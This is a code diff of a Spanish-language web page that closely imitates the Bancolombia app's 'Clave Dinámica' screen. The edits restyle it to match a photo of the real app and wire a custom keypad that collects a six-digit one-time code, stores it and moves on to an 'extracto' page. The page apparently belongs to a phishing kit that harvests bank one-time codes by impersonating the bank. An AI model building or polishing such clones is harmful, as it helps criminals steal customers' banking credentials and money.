@@ -18,7 +18,7 @@
         }
 
         body {
-            background-color: #ffffff; 
+            background-color: #f4f4f4; /* Fondo gris claro para que resalte la tarjeta blanca */
             display: flex;
             justify-content: center;
             min-height: 100vh;
@@ -28,7 +28,7 @@
         .mobile-container {
             width: 100%; 
             max-width: 100%; 
-            background-color: #ffffff;
+            background-color: #f4f4f4;
             min-height: 100vh;
             position: relative;
             display: flex;
@@ -40,6 +40,7 @@
                 max-width: 450px;
                 box-shadow: 0 0 20px rgba(0,0,0,0.1);
                 margin: 0 auto;
+                background-color: #f4f4f4;
             }
         }
 
@@ -47,10 +48,8 @@
         .header {
             display: flex;
             align-items: center;
-            justify-content: space-between;
             padding: 15px 20px;
-            border-bottom: 1px solid #f0f0f0;
-            background-color: #fff;
+            background-color: #ffffff;
         }
 
         .header-left {
@@ -60,20 +59,17 @@
         }
 
         .close-icon {
-            font-size: 24px;
+            font-size: 28px;
             color: #666;
             text-decoration: none;
             font-weight: 300;
+            line-height: 1;
         }
 
         .header-title {
             font-size: 14px;
-            font-weight: 600;
+            font-weight: 400;
             color: #333;
-        }
-
-        .header-right img {
-            height: 20px; 
         }
 
         /* --- CONTENIDO PRINCIPAL --- */
@@ -95,28 +91,32 @@
             font-size: 14px;
             color: #555;
             line-height: 1.5;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         .subtitle strong {
             color: #222;
         }
 
-        /* --- INPUTS DE CLAVE --- */
-        .key-input-container {
+        /* --- TARJETA BLANCA DE LA CLAVE --- */
+        .key-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 25px 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
         }
 
         .lock-icon {
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
 
         .lock-icon svg {
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             fill: none;
             stroke: #444;
             stroke-width: 2;
@@ -125,49 +125,51 @@
         }
 
         .input-label {
-            font-size: 12px;
-            color: #555;
-            margin-bottom: 15px;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 25px;
         }
 
         .digits-container {
             display: flex;
-            gap: 12px;
+            justify-content: center;
+            gap: 15px;
+            width: 100%;
+            padding: 0 10px;
         }
 
-        /* Cajas falsas que simulan los inputs (No abren teclado) */
+        /* Cajas falsas (No abren teclado) */
         .digit-box {
             width: 25px;
             height: 30px;
-            border-bottom: 2px solid #333;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             text-align: center;
             color: #222;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding-bottom: 2px;
+            border-bottom: 2px solid #333; /* Línea individual debajo de cada número */
         }
 
         /* --- BOTÓN CONTINUAR --- */
         .btn-continue {
             width: 100%;
-            background-color: #DCDCDC; 
+            background-color: #E0E0E0; /* Gris claro */
             color: #888;
             border: none;
-            padding: 14px;
-            border-radius: 25px; 
+            padding: 16px;
+            border-radius: 30px; 
             font-size: 16px;
             font-weight: 700;
             cursor: not-allowed; 
             transition: all 0.3s ease;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .btn-continue.active {
-            background-color: #FDDA24; 
-            color: #000;
+            background-color: #FDDA24; /* Amarillo Bancolombia */
+            color: #222;
             cursor: pointer;
         }
 
@@ -175,30 +177,33 @@
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
+            gap: 6px;
+            background-color: #dcdcdc; /* Fondo gris del teclado */
+            padding: 10px;
+            border-radius: 8px;
             margin-top: auto; 
         }
 
         .key-btn {
             background-color: #ffffff;
             border: none;
-            border-radius: 6px;
-            padding: 15px 0;
+            border-radius: 4px;
+            padding: 12px 0;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             cursor: pointer;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
             transition: background-color 0.1s;
         }
 
         .key-btn:active {
-            background-color: #f0f0f0;
+            background-color: #e6e6e6;
         }
 
         .key-number {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 400;
             color: #222;
             line-height: 1;
@@ -206,24 +211,30 @@
 
         .key-letters {
             font-size: 9px;
-            color: #888;
+            color: #666;
             letter-spacing: 1px;
-            margin-top: 4px;
+            margin-top: 2px;
         }
 
+        /* El botón de borrar no se ve en la foto, pero es necesario. Lo hacemos sutil */
         .key-btn.action {
             background-color: transparent;
             box-shadow: none;
         }
 
         .key-btn.action svg {
-            width: 24px;
-            height: 24px;
+            width: 22px;
+            height: 22px;
             fill: none;
-            stroke: #333;
+            stroke: #555;
             stroke-width: 2;
             stroke-linecap: round;
             stroke-linejoin: round;
+        }
+
+        /* Espacio vacío en el teclado */
+        .empty-space {
+            visibility: hidden;
         }
 
     </style>
@@ -231,14 +242,11 @@
 <body>
 
     <div class="mobile-container">
-        <!-- Header -->
+        <!-- Header sin logo -->
         <header class="header">
             <div class="header-left">
                 <a href="index.html" class="close-icon">&times;</a>
                 <span class="header-title">Ingresa la Clave Dinámica</span>
-            </div>
-            <div class="header-right">
-                <img src="logo.png" alt="Bancolombia">
             </div>
         </header>
 
@@ -246,11 +254,11 @@
         <main class="content">
             <h1 class="main-title">Ingresa la Clave Dinámica</h1>
             <p class="subtitle">
-                Ve a la app anterior <strong>"Bancolombia Personas"</strong> y tráela para continuar.
+                Ve a la app anterior <strong>'Bancolombia Personas'</strong> y tráela para continuar.
             </p>
 
-            <!-- Inputs -->
-            <div class="key-input-container">
+            <!-- Tarjeta Blanca -->
+            <div class="key-card">
                 <div class="lock-icon">
                     <svg viewBox="0 0 24 24">
                         <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
@@ -260,7 +268,7 @@
                 <span class="input-label">Ingresa la Clave Dinámica</span>
                 
                 <div class="digits-container" id="digits-container">
-                    <!-- Ahora son DIVs, no inputs. No abren teclado -->
+                    <!-- DIVs en lugar de inputs -->
                     <div class="digit-box"></div>
                     <div class="digit-box"></div>
                     <div class="digit-box"></div>
@@ -287,7 +295,7 @@
                 <button class="key-btn" data-key="8"><span class="key-number">8</span><span class="key-letters">TUV</span></button>
                 <button class="key-btn" data-key="9"><span class="key-number">9</span><span class="key-letters">WXYZ</span></button>
                 
-                <button class="key-btn action" disabled></button> 
+                <button class="key-btn empty-space" disabled></button> 
                 <button class="key-btn" data-key="0"><span class="key-number">0</span></button>
                 <button class="key-btn action" id="btn-backspace">
                     <svg viewBox="0 0 24 24">
@@ -301,7 +309,6 @@
     </div>
 
     <script>
-        // Ahora seleccionamos los DIVs en lugar de inputs
         const digitBoxes = document.querySelectorAll('.digit-box');
         const btnContinue = document.getElementById('btn-continue');
         const keypad = document.getElementById('keypad');
@@ -309,9 +316,7 @@
         
         let currentIndex = 0;
 
-        // Función para actualizar el estado del botón
         function checkButtonState() {
-            // Verifica si todas las cajas tienen texto
             const allFilled = Array.from(digitBoxes).every(box => box.textContent !== '');
             
             if (allFilled) {
@@ -323,22 +328,19 @@
             }
         }
 
-        // Lógica del teclado virtual
         keypad.addEventListener('click', (e) => {
             const btn = e.target.closest('.key-btn');
-            if (!btn || btn.disabled) return;
+            if (!btn || btn.disabled || btn.classList.contains('empty-space')) return;
 
             const key = btn.getAttribute('data-key');
             
             if (key && currentIndex < 6) {
-                // Escribir el número en la caja actual
                 digitBoxes[currentIndex].textContent = key;
                 currentIndex++;
                 checkButtonState();
             }
         });
 
-        // Lógica del botón borrar (Backspace)
         btnBackspace.addEventListener('click', () => {
             if (currentIndex > 0) {
                 currentIndex--;
@@ -347,7 +349,7 @@
             }
         });
 
-        // Permitir escribir con el teclado físico (solo para pruebas en PC)
+        // Teclado físico (solo para PC)
         document.addEventListener('keydown', (e) => {
             if (e.key >= '0' && e.key <= '9' && currentIndex < 6) {
                 digitBoxes[currentIndex].textContent = e.key;
@@ -360,13 +362,10 @@
             }
         });
 
-        // Lógica para pasar a extracto.html
         btnContinue.addEventListener('click', () => {
             if (!btnContinue.disabled) {
-                // Si necesitas guardar la clave para usarla en extracto.html:
                 const claveDinamica = Array.from(digitBoxes).map(box => box.textContent).join('');
                 sessionStorage.setItem('claveDinamica', claveDinamica);
-                
                 window.location.href = 'extracto.html';
             }
         });
